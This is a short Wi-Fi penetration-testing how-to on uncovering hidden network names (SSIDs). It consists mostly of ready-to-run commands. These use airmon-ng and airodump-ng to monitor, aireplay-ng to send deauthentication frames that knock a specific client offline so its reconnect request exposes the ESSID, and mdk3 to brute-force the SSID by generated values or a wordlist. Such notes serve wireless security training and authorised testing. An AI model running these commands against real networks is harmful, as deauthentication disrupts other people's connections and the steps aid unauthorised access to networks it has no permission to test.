# How to find hidden SSIDs
Hiding SSIDs is a superficial attempt at masking SSIDs from casual users and attackers by making it less visible. 2 methods to get their ESSID, deauth and bruteforcing.
## Deauth
If there are clients connected to hidden networks you can deauth them, then capture the request they send to re-connect which will contain the ESSID / network name. 
```
sudo airmon-ng start wlan1
```
```
sudo airodump-ng wlan1mon
```
```
sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan1mon
```
## Brute forcing hidden SSID
With `mdk3`, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names:
```
mdk3 <interface> <test mode> [test_ options]
```
Brute forcing all possible values:
```
sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
```
Brute forcing using a wordlist:
```
sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5
```
